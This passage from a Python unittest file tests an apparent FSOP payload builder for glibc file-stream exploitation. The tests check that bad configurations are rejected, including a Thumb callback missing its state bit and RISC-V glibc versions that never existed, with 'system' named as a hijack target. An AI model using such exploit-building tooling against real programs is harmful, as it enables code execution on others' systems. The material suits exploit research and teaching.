                self.assertTrue(payload.metadata["callback_is_descriptor"])

    def test_constructor_rejects_heap_without_addresses_and_standard_address_override(self) -> None:
        libc = _libc(resolve_target("x86_64"), "2.23")
        with self.assertRaises((ValueError, FSOPCapabilityError)):
            FSOP(libc, stream=FSOPStream.HEAP, family=FSOPFamily.LEGACY, glibc_version="2.23")
        with self.assertRaises((ValueError, FSOPCapabilityError)):
            FSOP(
                libc,
                stream=FSOPStream.STDOUT,
                family=FSOPFamily.LEGACY,
                address=0x404000,
                storage=0x500000,
                glibc_version="2.23",
            )

    def test_raw_thumb_callback_requires_a_prepared_state_bit(self) -> None:
        target = resolve_target("thumb")
        builder = _legacy_builder(target, stream=FSOPStream.STDOUT)
        with self.assertRaisesRegex(FSOPCapabilityError, "Thumb|state"):
            builder.build(FSOPActivation.FFLUSH, 0x401000)
        accepted = builder.build(FSOPActivation.FFLUSH, 0x401001)
        callback = next(item for item in accepted.relocations if "callback" in item.role)
        self.assertEqual(callback.value, 0x401001)

    def test_synthetic_pre_glibc_riscv_versions_are_rejected(self) -> None:
        for target_name in ("riscv32", "riscv64"):
            target = resolve_target(target_name)
            with self.subTest(target=target.name), self.assertRaisesRegex(FSOPCapabilityError, "upstream|real"):
                FSOP(
                    _libc(target, "2.23"),
                    stream=FSOPStream.HEAP,
                    family=FSOPFamily.LEGACY,
                    address=0x400000,
                    storage=0x500000,
                    glibc_version="2.23",
                ).build(
                    FSOPActivation.EXPLICIT,
                    "system",
                    slot=IOJumpSlot.OVERFLOW,
                    dispatch_attested=True,
                )


if __name__ == "__main__":
    unittest.main()
